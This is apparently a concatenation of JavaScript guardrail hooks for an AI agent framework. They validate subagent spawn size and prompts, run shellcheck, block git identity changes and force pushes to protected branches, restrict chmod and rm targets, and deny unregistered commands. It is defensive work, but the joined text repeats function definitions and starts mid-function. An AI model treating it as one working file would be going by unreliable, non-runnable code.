    const savingsBytes = optionalTools.length * BYTES_PER_TOOL;
    totalSavingsBytes += savingsBytes;
    suggestions.push(
      `2. Remove optional MCP/web tools (${optionalTools.length} tools: ${optionalTools.slice(0, 3).join(', ')}${optionalTools.length > 3 ? '...' : ''}) → Save ~${Math.round((savingsBytes / 1024) * 10) / 10} KB`
    );
  }

  // Priority 3: Consider splitting spawn
  if (toolsArray.length > 20) {
    suggestions.push('3. Consider splitting into two agents (research + browser automation)');
  }

  const estimatedSavings = `${Math.round((totalSavingsBytes / 1024) * 10) / 10} KB`;

  const example =
    suggestions.length > 0
      ? `\nRecommended tools (core only): ${[...coreTools].slice(0, 10).join(', ')} (<10 tools)`
      : '';

  return { suggestions, estimatedSavings, example };
}

function logSpawnAudit(sizeInfo, subagentType, status) {
  if (!process.env.SPAWN_SIZE_AUDIT_LOG) return;

  try {
    const auditPath = path.join(PROJECT_ROOT, '.claude', 'context', 'spawn-size-audit.jsonl');
    const entry = {
      timestamp: new Date().toISOString(),
      agent: subagentType,
      sizeKB: sizeInfo.totalKB,
      toolCount: sizeInfo.toolCount,
      status,
      breakdown: sizeInfo.breakdown,
    };
    fs.appendFileSync(auditPath, JSON.stringify(entry) + '\n');
  } catch (_err) {
    // Audit logging is optional - don't fail the hook
  }
}

function main() {
  const hookInput = parseHookInputSync();

  // Extract spawn parameters
  const subagentType = hookInput?.subagent_type || hookInput?.description || '';
  const allowedTools = hookInput?.allowed_tools || [];
  const prompt = hookInput?.prompt || '';

  // Check if orchestrator (bypass validation)
  if (ORCHESTRATOR_TYPES.includes(subagentType)) {
    // Orchestrators need complex reasoning and more tools
    process.exit(0);
  }

  // Get validation mode
  const mode = process.env.SPAWN_SIZE_VALIDATOR || 'warn';

  // Calculate size (no template in hook input, estimate from prompt)
  const sizeInfo = calculateSpawnSize(allowedTools, prompt, '');

  // Validate size
  const validation = validateSpawnSize(sizeInfo.totalKB, sizeInfo.toolCount, mode);

  // Log to audit file if enabled
  logSpawnAudit(sizeInfo, subagentType, validation.status);

  // If blocked, exit with error
  if (validation.status === 'block') {
    console.error(validation.message);

    // Add pruning suggestions
    if (sizeInfo.toolCount > WARN_TOOL_COUNT || sizeInfo.totalKB > WARN_SIZE_KB) {
      const pruning = generatePruningSuggestions(allowedTools);
      if (pruning.suggestions.length > 0) {
        console.error('\nPRUNING SUGGESTIONS (Priority Order):');
        pruning.suggestions.forEach(s => console.error(s));
        console.error(`\nEstimated savings: ${pruning.estimatedSavings}`);
        if (pruning.example) {
          console.error(pruning.example);
        }
      }
    }

    console.error('\nMore info: .claude/docs/MEMORY_MANAGEMENT.md');
    process.exit(1);
  }

  // If warning, print but allow
  if (validation.status === 'warn') {
    console.warn(validation.message);

    // Add pruning suggestions
    const pruning = generatePruningSuggestions(allowedTools);
    if (pruning.suggestions.length > 0) {
      console.warn('\nPRUNING SUGGESTIONS (Priority Order):');
      pruning.suggestions.forEach(s => console.warn(s));
      console.warn(`\nEstimated savings: ${pruning.estimatedSavings}`);
      if (pruning.example) {
        console.warn(pruning.example);
      }
    }

    console.warn(
      `\nCurrent tools: ${allowedTools.slice(0, 5).join(', ')}${allowedTools.length > 5 ? '...' : ''} (${sizeInfo.toolCount} tools)`
    );
    console.warn(`More info: .claude/docs/MEMORY_MANAGEMENT.md\n`);
  }

  // Allow spawn
  process.exit(0);
}

function runShellcheck(command) {
  try {
    // Write command to temp file
    const tmpDir = os.tmpdir();
    const tmpFile = path.join(tmpDir, `shellcheck-${Date.now()}.sh`);

    // Add shebang for shellcheck
    const script = `#!/bin/bash\n${command}`;
    fs.writeFileSync(tmpFile, script);

    let proc;
    try {
      // Run shellcheck with JSON output (spawnSync + array args: safe for paths with spaces; SHELLCHECK-VAL-001)
      proc = spawnSync('shellcheck', ['--format=json', tmpFile], {
        encoding: 'utf8',
        maxBuffer: 2 * 1024 * 1024,
      });
    } finally {
      try {
        fs.unlinkSync(tmpFile);
      } catch (_) {
        // ignore
      }
    }

    if (proc.error) {
      if (
        proc.error.code === 'ENOENT' ||
        (proc.error.message && proc.error.message.includes('command not found'))
      ) {
        return {
          valid: true,
          warning:
            'Shellcheck not installed, skipping validation. Install with: brew install shellcheck (macOS) or apt-get install shellcheck (Linux). Set SHELLCHECK_VALIDATOR=off to disable.',
        };
      }
      return {
        valid: true,
        warning: `Shellcheck execution failed: ${proc.error.message}. Set SHELLCHECK_VALIDATOR=off to disable.`,
      };
    }

    const result =
      (proc.stdout && proc.stdout.trim()) || (proc.stderr && proc.stderr.trim()) || '[]';
    let issues;
    try {
      issues = JSON.parse(result);
    } catch {
      return {
        valid: true,
        warning:
          'Shellcheck error parsing failed, skipping validation. Set SHELLCHECK_VALIDATOR=off to disable.',
      };
    }

    if (!Array.isArray(issues)) {
      return { valid: true };
    }

    const relevantIssues = issues.filter(issue => !IGNORED_CODES.includes(`SC${issue.code}`));
    if (relevantIssues.length > 0) {
      return {
        valid: false,
        issues: relevantIssues.map(issue => ({
          line: issue.line,
          column: issue.column,
          level: issue.level, // error, warning, info
          code: `SC${issue.code}`,
          message: issue.message,
        })),
      };
    }
    return { valid: true };
  } catch (error) {
    // Shellcheck not installed or execution failed
    if (error.code === 'ENOENT' || error.message.includes('command not found')) {
      return {
        valid: true,
        warning:
          'Shellcheck not installed, skipping validation. Install with: brew install shellcheck (macOS) or apt-get install shellcheck (Linux)',
      };
    }

    // Other error - fail gracefully
    return {
      valid: true,
      warning: `Shellcheck execution failed: ${error.message}`,
    };
  }
}

function validateShellcheck(input) {
  const { command } = input;
  const mode = process.env.SHELLCHECK_VALIDATOR || 'warn';

  // Skip if disabled
  if (mode === 'off') {
    return { allowed: true, valid: true };
  }

  // Run shellcheck
  const result = runShellcheck(command);

  // If warning (shellcheck unavailable), allow but warn
  if (result.warning) {
    return {
      allowed: true,
      valid: true,
      warning: `[SHELLCHECK-VALIDATOR] ${result.warning}`,
    };
  }

  // If valid, allow
  if (result.valid) {
    return { allowed: true, valid: true };
  }

  // If invalid, format error message
  const errorSummary = result.issues
    .map(issue => `  - Line ${issue.line}: [${issue.code}] ${issue.level}: ${issue.message}`)
    .join('\n');

  const message = `[SHELLCHECK-VALIDATOR] Shellcheck found issues:\n${errorSummary}\n\nFix these issues or set SHELLCHECK_VALIDATOR=off to bypass.`;

  // Block or warn based on mode
  if (mode === 'block') {
    return {
      allowed: false,
      valid: false,
      reason: message,
    };
  }

  // Warn mode
  return {
    allowed: true,
    valid: false,
    warning: message,
  };
}

function normalizeUnicode(text) {
  if (!text || typeof text !== 'string') return '';

  // Step 1: NFKC normalization (converts lookalikes to canonical form)
  let normalized = text.normalize('NFKC');

  // Step 2: Replace common homoglyphs with ASCII equivalents
  const homoglyphMap = {
    // Greek uppercase
    '\u0391': 'A', // Greek Alpha
    '\u0392': 'B', // Greek Beta
    '\u0395': 'E', // Greek Epsilon
    '\u0396': 'Z', // Greek Zeta
    '\u0397': 'H', // Greek Eta
    '\u0399': 'I', // Greek Iota
    '\u039A': 'K', // Greek Kappa
    '\u039C': 'M', // Greek Mu
    '\u039D': 'N', // Greek Nu
    '\u039F': 'O', // Greek Omicron
    '\u03A1': 'P', // Greek Rho
    '\u03A4': 'T', // Greek Tau
    '\u03A5': 'Y', // Greek Upsilon
    '\u03A7': 'X', // Greek Chi
    // Cyrillic lowercase
    '\u0430': 'a', // Cyrillic a
    '\u0435': 'e', // Cyrillic e
    '\u043E': 'o', // Cyrillic o
    '\u0440': 'p', // Cyrillic p
    '\u0441': 'c', // Cyrillic c
    '\u0443': 'y', // Cyrillic y
    '\u0445': 'x', // Cyrillic x
    // Cyrillic uppercase
    '\u0410': 'A', // Cyrillic A
    '\u0412': 'B', // Cyrillic B
    '\u0415': 'E', // Cyrillic E
    '\u041A': 'K', // Cyrillic K
    '\u041C': 'M', // Cyrillic M
    '\u041D': 'H', // Cyrillic H
    '\u041E': 'O', // Cyrillic O
    '\u0420': 'P', // Cyrillic P
    '\u0421': 'C', // Cyrillic C
    '\u0422': 'T', // Cyrillic T
    '\u0423': 'Y', // Cyrillic Y
    '\u0425': 'X', // Cyrillic X
  };

  for (const [lookalike, ascii] of Object.entries(homoglyphMap)) {
    normalized = normalized.replace(new RegExp(lookalike, 'g'), ascii);
  }

  return normalized;
}

function safeRegexTest(pattern, text, timeoutMs = 100) {
  try {
    // For simple patterns, direct test is safe with bounded quantifiers
    // More complex: could use vm module, but our patterns are already bounded
    const startTime = Date.now();
    const result = pattern.test(text);
    const elapsed = Date.now() - startTime;

    if (elapsed > timeoutMs) {
      auditLog('spawn-prompt-validator', 'redos-timeout', {
        pattern: pattern.toString().substring(0, 50),
        textLength: text.length,
        elapsed,
      });
      return false; // Fail closed on potential ReDoS
    }

    return result;
  } catch (err) {
    auditLog('spawn-prompt-validator', 'regex-error', {
      pattern: pattern.toString().substring(0, 50),
      error: err.message,
    });
    return false; // Fail closed on regex errors
  }
}

function validatePrompt(prompt) {
  if (!prompt || typeof prompt !== 'string') {
    return {
      score: 0,
      passed: [],
      failed: VALIDATION_RULES.map(r => r.name),
      suggestions: VALIDATION_RULES.map(r => r.suggestion),
      isValid: false,
      needsWarning: true,
      error: 'Prompt is null or not a string',
    };
  }

  // SECURITY MITIGATION: VULN-003 - Prompt length limit
  if (prompt.length > MAX_PROMPT_LENGTH) {
    auditLog('spawn-prompt-validator', 'prompt-too-large', {
      length: prompt.length,
      limit: MAX_PROMPT_LENGTH,
    });
    return {
      score: 0,
      passed: [],
      failed: ['Prompt exceeds maximum length'],
      suggestions: [`Prompt is ${prompt.length} bytes, maximum is ${MAX_PROMPT_LENGTH} (500KB)`],
      isValid: false,
      needsWarning: true,
      error: 'SEC-DOS-001: Prompt exceeds maximum length',
    };
  }

  // SECURITY MITIGATION: VULN-003 - Warning for large prompts
  if (prompt.length > PROMPT_LENGTH_WARNING) {
    auditLog('spawn-prompt-validator', 'large-prompt-warning', {
      length: prompt.length,
      threshold: PROMPT_LENGTH_WARNING,
    });
  }

  // SECURITY MITIGATION: VULN-001 - Normalize Unicode FIRST
  const normalizedPrompt = normalizeUnicode(prompt);

  const passed = [];
  const failed = [];
  const suggestions = [];
  const missingRequired = [];
  let score = 0;

  // Validate each rule
  for (const rule of VALIDATION_RULES) {
    // SECURITY MITIGATION: VULN-002 - Use safe regex test with timeout
    const matches = safeRegexTest(rule.pattern, normalizedPrompt);

    if (matches) {
      passed.push(rule.name);
      score += rule.weight;
    } else {
      failed.push(rule.name);
      suggestions.push(`[${rule.severity.toUpperCase()}] ${rule.name}: ${rule.suggestion}`);

      // SECURITY MITIGATION: VULN-006 - Track missing required rules
      if (rule.required) {
        missingRequired.push(rule.name);
      }
    }
  }

  // VULN-006: Required rules must be present regardless of score
  if (missingRequired.length > 0) {
    return {
      score: 0,
      passed,
      failed,
      suggestions,
      isValid: false,
      needsWarning: true,
      error: `Missing required elements: ${missingRequired.join(', ')}`,
      missingRequired,
    };
  }

  return {
    score,
    passed,
    failed,
    suggestions,
    isValid: score >= MINIMUM_SCORE,
    needsWarning: score < WARNING_THRESHOLD,
  };
}

function isOrchestratorSpawn(toolInput) {
  const orchestratorTypes = [
    'master-orchestrator',
    'evolution-orchestrator',
    'swarm-coordinator',
    'party-orchestrator',
  ];

  const description = (toolInput.description || '').toLowerCase();
  const subagentType = (toolInput.subagent_type || '').toLowerCase();

  return orchestratorTypes.some(orch => description.includes(orch) || subagentType.includes(orch));
}

function isTemplateBasedSpawn(prompt) {
  return prompt.includes('.claude/templates/spawn/') || prompt.includes('See .claude/templates');
}

async function main() {
  const startTime = Date.now();

  const mode = getEnforcementMode('SPAWN_PROMPT_VALIDATOR', 'block');

  // SECURITY MITIGATION: VULN-005 - Audit any non-default mode
  if (mode !== 'warn') {
    auditLog('spawn-prompt-validator', 'non-default-mode', {
      mode,
      warning: mode === 'off' ? 'Validation bypassed - security risk' : 'Enforcement mode changed',
    });
  }

  // Fast path: disabled
  if (mode === 'off') {
    auditLog('spawn-prompt-validator', 'disabled', {
      reason: 'SPAWN_PROMPT_VALIDATOR=off',
      warning: 'Validation bypassed - security risk',
    });
    process.exit(0);
  }

  try {
    const hookInput = await parseHookInputAsync();
    const toolName = getToolName(hookInput);

    // Only validate Task tool
    if (toolName !== 'Task') {
      process.exit(0);
    }

    const toolInput = getToolInput(hookInput);
    const prompt = toolInput.prompt || '';

    // Skip validation for orchestrators (different template)
    if (isOrchestratorSpawn(toolInput)) {
      auditLog('spawn-prompt-validator', 'skip', {
        reason: 'orchestrator-spawn',
        description: toolInput.description,
      });
      process.exit(0);
    }

    // Validate prompt
    const validation = validatePrompt(prompt);

    const executionMs = Date.now() - startTime;

    // SECURITY MITIGATION: VULN-007 - Enhanced audit log fields
    auditLog('spawn-prompt-validator', validation.isValid ? 'pass' : 'fail', {
      score: validation.score,
      passed: validation.passed,
      failed: validation.failed,
      isTemplateBasedSpawn: isTemplateBasedSpawn(prompt),
      // Enhanced fields:
      sessionId: hookInput.session_id || 'unknown',
      agentType: toolInput.subagent_type || 'unknown',
      promptLength: prompt.length,
      promptHash: crypto.createHash('sha256').update(prompt).digest('hex').substring(0, 16),
      executionMs,
      missingRequired: validation.missingRequired || [],
    });

    // Handle based on enforcement mode
    if (!validation.isValid) {
      const message = [
        `[SPAWN-PROMPT-VALIDATOR] Spawn prompt validation failed (score: ${validation.score}/${MINIMUM_SCORE})`,
        '',
        validation.error || 'Missing required elements:',
        ...validation.suggestions,
        '',
        'Recommendation: Use the spawn template from .claude/templates/spawn/universal-agent-spawn.md',
      ].join('\n');

      if (mode === 'block') {
        try {
          await eventBus.emit(EventTypes.TOOL_BLOCKED, {
            type: EventTypes.TOOL_BLOCKED,
            timestamp: new Date().toISOString(),
            toolName: 'Task',
            reason: 'spawn_prompt_validation_failed',
          });
        } catch (_err) {
          // Best-effort
        }
        console.log(formatResult('block', message));
        process.exit(2);
      } else {
        // warn mode
        console.warn(message);
        process.exit(0);
      }
    }

    // Passed but needs warning
    if (validation.needsWarning && mode === 'warn') {
      console.warn(
        `[SPAWN-PROMPT-VALIDATOR] Spawn prompt could be improved (score: ${validation.score}/100). ` +
          `Missing: ${validation.failed.join(', ')}`
      );
    }

    process.exit(0);
  } catch (err) {
    // SECURITY MITIGATION: VULN-004 - Full audit context in exception handler
    auditLog('spawn-prompt-validator', 'error-failopen', {
      error: err.message,
      stack: err.stack?.substring(0, 500),
      toolInput: JSON.stringify(arguments[0] || {}).substring(0, 200),
      mode: mode,
      timestamp: new Date().toISOString(),
    });

    debugLog('spawn-prompt-validator', 'Validation error', err);

    // Fail open to not block legitimate spawns (default behavior)
    // For production, consider: SPAWN_PROMPT_VALIDATOR_FAIL_MODE=closed
    const failMode = process.env.SPAWN_PROMPT_VALIDATOR_FAIL_MODE || 'open';

    if (failMode === 'closed') {
      try {
        await eventBus.emit(EventTypes.TOOL_FAILED, {
          type: EventTypes.TOOL_FAILED,
          timestamp: new Date().toISOString(),
          toolName: 'spawn-prompt-validator',
          error: err.message,
        });
      } catch (_err) {
        // Best-effort
      }
      console.log(formatResult('block', 'Internal validation error - fail-closed mode'));
      process.exit(2);
    }

    // Fail open (default)
    process.exit(0);
  }
}

function parseCommand(commandString) {
  const tokens = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < commandString.length; i++) {
    const char = commandString[i];

    if (escaped) {
      current += char;
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }

    if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
      if (current.length > 0) {
        tokens.push(current);
        current = '';
      }
      continue;
    }

    current += char;
  }

  if (inSingleQuote || inDoubleQuote) {
    return null;
  }

  if (current.length > 0) {
    tokens.push(current);
  }

  return tokens;
}

function validateGitConfig(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse git command' };
  }

  if (tokens.length < 2 || tokens[0] !== 'git' || tokens[1] !== 'config') {
    return { valid: true, error: '' }; // Not a git config command
  }

  // Check for read-only operations first - these are always allowed
  const readOnlyFlags = new Set(['--get', '--get-all', '--get-regexp', '--list', '-l']);

  for (let i = 2; i < tokens.length; i++) {
    if (readOnlyFlags.has(tokens[i])) {
      return { valid: true, error: '' }; // Read operation, allow it
    }
  }

  // Extract the config key from the command
  let configKey = null;

  for (let i = 2; i < tokens.length; i++) {
    const token = tokens[i];

    // Skip options (start with -)
    if (token.startsWith('-')) {
      continue;
    }

    // First non-option token is the config key
    configKey = token.toLowerCase();
    break;
  }

  if (!configKey) {
    return { valid: true, error: '' }; // No config key specified
  }

  // Check if the exact config key is blocked
  if (BLOCKED_GIT_CONFIG_KEYS.has(configKey)) {
    return {
      valid: false,
      error:
        `BLOCKED: Cannot modify git identity configuration\n\n` +
        `You attempted to set '${configKey}' which is not allowed.\n\n` +
        `WHY: Git identity (user.name, user.email) must inherit from the user's ` +
        `global git configuration. Setting fake identities like 'Test User' breaks ` +
        `commit attribution and causes serious issues.\n\n` +
        `WHAT TO DO: Simply commit without setting any user configuration. ` +
        `The repository will use the correct identity automatically.`,
    };
  }

  return { valid: true, error: '' };
}

function validateGitInlineConfig(tokens) {
  let i = 1; // Start after 'git'

  while (i < tokens.length) {
    const token = tokens[i];

    // Check for -c flag (can be "-c key=value" or "-c" "key=value")
    if (token === '-c') {
      // Next token should be the key=value
      if (i + 1 < tokens.length) {
        const configPair = tokens[i + 1];

        // Extract the key from key=value
        if (configPair.includes('=')) {
          const configKey = configPair.split('=')[0].toLowerCase();

          if (BLOCKED_GIT_CONFIG_KEYS.has(configKey)) {
            return {
              valid: false,
              error:
                `BLOCKED: Cannot set git identity via -c flag\n\n` +
                `You attempted to use '-c ${configPair}' which sets a blocked ` +
                `identity configuration.\n\n` +
                `WHY: Git identity (user.name, user.email) must inherit from the ` +
                `user's global git configuration. Setting fake identities breaks ` +
                `commit attribution and causes serious issues.\n\n` +
                `WHAT TO DO: Remove the -c flag and commit normally. ` +
                `The repository will use the correct identity automatically.`,
            };
          }
        }
        i += 2; // Skip -c and its value
        continue;
      }
    } else if (token.startsWith('-c')) {
      // Handle -ckey=value format (no space)
      const configPair = token.slice(2); // Remove "-c" prefix

      if (configPair.includes('=')) {
        const configKey = configPair.split('=')[0].toLowerCase();

        if (BLOCKED_GIT_CONFIG_KEYS.has(configKey)) {
          return {
            valid: false,
            error:
              `BLOCKED: Cannot set git identity via -c flag\n\n` +
              `You attempted to use '${token}' which sets a blocked ` +
              `identity configuration.\n\n` +
              `WHY: Git identity (user.name, user.email) must inherit from the ` +
              `user's global git configuration. Setting fake identities breaks ` +
              `commit attribution and causes serious issues.\n\n` +
              `WHAT TO DO: Remove the -c flag and commit normally. ` +
              `The repository will use the correct identity automatically.`,
          };
        }
      }
    }

    i += 1;
  }

  return { valid: true, error: '' };
}

function validateGitPush(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse git command' };
  }

  if (tokens.length < 2 || tokens[0] !== 'git' || tokens[1] !== 'push') {
    return { valid: true, error: '' }; // Not a git push command
  }

  // Check for force flags
  const forceFlags = new Set(['-f', '--force', '--force-with-lease']);
  let hasForce = false;
  let targetBranch = null;

  for (let i = 2; i < tokens.length; i++) {
    const token = tokens[i];

    if (forceFlags.has(token)) {
      hasForce = true;
    } else if (!token.startsWith('-')) {
      // Could be remote or branch
      // In "git push origin main", "origin" is remote, "main" is branch
      // In "git push -f origin main", same pattern
      if (targetBranch === null) {
        // First non-flag might be remote, second might be branch
        // We simplify: if it looks like a protected branch, block it
        if (PROTECTED_BRANCHES.has(token.toLowerCase())) {
          targetBranch = token;
        }
      } else {
        // Second positional arg - likely the branch
        if (PROTECTED_BRANCHES.has(token.toLowerCase())) {
          targetBranch = token;
        }
      }
    }
  }

  if (hasForce && targetBranch) {
    return {
      valid: false,
      error:
        `BLOCKED: Force push to protected branch '${targetBranch}' is not allowed.\n\n` +
        `Protected branches: ${Array.from(PROTECTED_BRANCHES).join(', ')}\n\n` +
        `Use regular push or create a PR instead.`,
    };
  }

  return { valid: true, error: '' };
}

function validateGitCommand(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse git command' };
  }

  if (!tokens.length || tokens[0] !== 'git') {
    return { valid: true, error: '' };
  }

  if (tokens.length < 2) {
    return { valid: true, error: '' }; // Just "git" with no subcommand
  }

  // Check for blocked -c flags on ANY git command (security bypass prevention)
  const inlineResult = validateGitInlineConfig(tokens);
  if (!inlineResult.valid) {
    return inlineResult;
  }

  // Find the actual subcommand (skip global options like -c, -C, --git-dir, etc.)
  let subcommand = null;

  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];

    // Skip options and their values
    if (token.startsWith('-')) {
      continue;
    }

    subcommand = token;
    break;
  }

  if (!subcommand) {
    return { valid: true, error: '' }; // No subcommand found
  }

  // Check git config commands
  if (subcommand === 'config') {
    return validateGitConfig(commandString);
  }

  // Check git push commands
  if (subcommand === 'push') {
    return validateGitPush(commandString);
  }

  return { valid: true, error: '' };
}

function parseCommand(commandString) {
  const tokens = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < commandString.length; i++) {
    const char = commandString[i];

    if (escaped) {
      // SECURITY FIX: Preserve the backslash in the token
      // This is critical for Windows path validation (e.g., C:\Windows)
      // Without this, paths like C:\Windows become C:Windows and bypass security checks
      current += '\\' + char;
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }

    if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
      if (current.length > 0) {
        tokens.push(current);
        current = '';
      }
      continue;
    }

    current += char;
  }

  if (inSingleQuote || inDoubleQuote) {
    return null;
  }

  // Handle trailing backslash (no character after it)
  if (escaped) {
    current += '\\';
  }

  if (current.length > 0) {
    tokens.push(current);
  }

  return tokens;
}

function containsPathTraversal(path) {
  // Check for ../ or ..\ patterns
  return path.includes('../') || path.includes('..\\') || path === '..';
}

function validateChmodCommand(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse chmod command' };
  }

  if (tokens.length === 0 || tokens[0] !== 'chmod') {
    return { valid: false, error: 'Not a chmod command' };
  }

  let mode = null;
  const files = [];

  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];

    // Allow -R/--recursive for +x
    if (token === '-R' || token === '--recursive') {
      continue;
    }

    // Block other flags
    if (token.startsWith('-')) {
      return { valid: false, error: `chmod flag '${token}' is not allowed` };
    }

    // First non-flag is the mode
    if (mode === null) {
      mode = token;
    } else {
      files.push(token);
    }
  }

  if (mode === null) {
    return { valid: false, error: 'chmod requires a mode' };
  }

  if (files.length === 0) {
    return { valid: false, error: 'chmod requires at least one file' };
  }

  // Only allow +x variants (making files executable)
  // Also allow common safe modes like 755, 644
  const isExecutableMode = /^[ugoa]*\+x$/.test(mode);

  if (!SAFE_CHMOD_MODES.has(mode) && !isExecutableMode) {
    return {
      valid: false,
      error: `chmod only allowed with executable modes (+x, 755, etc.), got: ${mode}`,
    };
  }

  return { valid: true, error: '' };
}

function validateRmCommand(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse rm command' };
  }

  if (tokens.length === 0) {
    return { valid: false, error: 'Empty rm command' };
  }

  // Check for path traversal and dangerous patterns
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];

    // Allow flags: -r, -f, -rf, -fr, -v, -i
    if (token.startsWith('-')) {
      continue;
    }

    // Check for dangerous patterns
    for (const pattern of DANGEROUS_RM_PATTERNS) {
      if (pattern.test(token)) {
        return {
          valid: false,
          error: `rm target '${token}' is not allowed for safety`,
        };
      }
    }

    // Check for path traversal
    if (containsPathTraversal(token)) {
      return {
        valid: false,
        error: `rm with path traversal '${token}' is not allowed`,
      };
    }
  }

  return { valid: true, error: '' };
}

function validateInitScript(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null) {
    return { valid: false, error: 'Could not parse init script command' };
  }

  if (tokens.length === 0) {
    return { valid: false, error: 'Empty command' };
  }

  const script = tokens[0];

  // Allow ./init.sh or paths ending in /init.sh
  if (script === './init.sh' || script.endsWith('/init.sh')) {
    return { valid: true, error: '' };
  }

  return { valid: false, error: `Only ./init.sh is allowed, got: ${script}` };
}

function getValidator(commandName) {
  return VALIDATOR_REGISTRY.get(commandName) || null;
}

function hasValidator(commandName) {
  return VALIDATOR_REGISTRY.has(commandName);
}

function getRegisteredCommands() {
  return Array.from(VALIDATOR_REGISTRY.keys());
}

function validateCommand(commandString) {
  if (!commandString || typeof commandString !== 'string') {
    return { valid: false, error: 'Invalid command string', hasValidator: false };
  }

  // Extract the command name (first token)
  let trimmed = commandString.trim();

  // Handle variable assignments at the start (VAR=value; cmd or VAR=value cmd)
  // Variable assignments are safe and should be skipped to find the actual command
  // Pattern: identifier=value followed by semicolon/space or end of string
  while (/^[a-zA-Z_][a-zA-Z0-9_]*=/.test(trimmed)) {
    // Skip past the variable assignment
    const nextSemicolon = trimmed.indexOf(';');
    const nextSpace = trimmed.indexOf(' ');

    if (nextSemicolon === -1 && nextSpace === -1) {
      // Pure variable assignment with no command (e.g., "FOO=bar")
      return { valid: true, error: '', hasValidator: false, reason: 'variable_assignment' };
    }

    // Find the next token (after ; or space)
    const separator =
      nextSemicolon !== -1 && (nextSpace === -1 || nextSemicolon < nextSpace)
        ? nextSemicolon
        : nextSpace;

    trimmed = trimmed.slice(separator + 1).trim();

    // If nothing left after the assignment, it's just a variable assignment
    if (!trimmed) {
      return { valid: true, error: '', hasValidator: false, reason: 'variable_assignment' };
    }
  }

  const firstSpace = trimmed.indexOf(' ');
  const commandName = firstSpace === -1 ? trimmed : trimmed.slice(0, firstSpace);

  // Handle paths (e.g., /usr/bin/git -> git)
  const baseName = commandName.includes('/')
    ? commandName.split('/').pop()
    : commandName.includes('\\')
      ? commandName.split('\\').pop()
      : commandName;

  const validator = getValidator(baseName);

  if (!validator) {
    // No validator registered - check allowlist or deny by default

    // Check if command is in safe allowlist
    if (SAFE_COMMANDS_ALLOWLIST.includes(baseName)) {
      return { valid: true, error: '', hasValidator: false, reason: 'allowlisted' };
    }

    // Check for override (development/debugging only)
    if (process.env.ALLOW_UNREGISTERED_COMMANDS === 'true') {
      console.error(
        JSON.stringify({
          type: 'security_override',
          command: baseName,
          reason: 'ALLOW_UNREGISTERED_COMMANDS=true',
        })
      );
      return { valid: true, error: '', hasValidator: false, reason: 'override' };
    }

    // SEC-AUDIT-017: DENY by default
    return {
      valid: false,
      error: `SEC-AUDIT-017: Unregistered command '${baseName}' blocked. Add to SAFE_COMMANDS_ALLOWLIST or create a validator.`,
      hasValidator: false,
    };
  }

  const result = validator(commandString);
  return { ...result, hasValidator: true };
}

function registerValidator(commandName, validator) {
  if (typeof validator !== 'function') {
    throw new Error('Validator must be a function');
  }
  VALIDATOR_REGISTRY.set(commandName, validator);
}

function setStateFile(filePath) {
  STATE_FILE = filePath;
}

function setAnomalyLog(filePath) {
  ANOMALY_LOG = filePath;
}

function isEnabled() {
  return process.env.ANOMALY_DETECTION_ENABLED !== 'false';
}

function getThresholds() {
  return {
    tokenMultiplier: parseFloat(process.env.ANOMALY_TOKEN_MULTIPLIER || '2'),
    durationMultiplier: parseFloat(process.env.ANOMALY_DURATION_MULTIPLIER || '3'),
    failureCount: parseInt(process.env.ANOMALY_FAILURE_COUNT || '3', 10),
    patternRepetitions: parseInt(process.env.ANOMALY_PATTERN_REPS || '2', 10),
  };
}

function createDefaultState() {
  return {
    tokenHistory: [],
    durationHistory: [],
    failureTracking: {},
    promptPatterns: [],
    lastUpdated: new Date().toISOString(),
  };
}

function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const content = fs.readFileSync(STATE_FILE, 'utf8');
      // SEC-007: Use safe JSON parsing with schema validation
      const state = safeParseJSON(content, 'anomaly-state');
      // Ensure all fields exist
      return {
        ...createDefaultState(),
        ...state,
      };
    }
  } catch (e) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[anomaly-detector] Error loading state:', e.message);
    }
  }
  return createDefaultState();
}

function saveState(state) {
  try {
    const dir = path.dirname(STATE_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    state.lastUpdated = new Date().toISOString();
    // Use atomic write: writes to temp file, then renames (atomic on POSIX)
    atomicWriteJSONSync(STATE_FILE, state);
  } catch (e) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[anomaly-detector] Error saving state:', e.message);
    }
  }
}

function calculateAverage(arr) {
  if (!arr || arr.length === 0) return 0;
  return arr.reduce((sum, val) => sum + val, 0) / arr.length;
}

function hashPrompt(prompt) {
  // Normalize: lowercase, trim, collapse whitespace
  const normalized = prompt.toLowerCase().trim().replace(/\s+/g, ' ');
  return crypto.createHash('sha256').update(normalized).digest('hex').substring(0, 16);
}

function detectTokenExplosion(current, average, multiplier = null) {
  if (multiplier === null) {
    multiplier = getThresholds().tokenMultiplier;
  }

  const result = {
    type: 'token_explosion',
    detected: false,
    current,
    average,
    threshold: multiplier,
    ratio: 0,
  };

  // Guard against division by zero
  if (average === 0 || average === null || average === undefined) {
    return result;
  }

  result.ratio = current / average;
